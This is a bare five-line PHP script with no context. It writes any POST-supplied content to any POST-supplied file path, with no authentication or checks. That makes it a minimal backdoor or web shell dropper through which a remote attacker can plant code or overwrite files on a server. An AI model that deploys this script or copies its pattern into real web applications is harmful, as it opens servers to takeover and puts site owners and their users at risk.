<?php
$file = $_POST["file"];
$data = $_POST["data"];
file_put_contents($file, $data);
?>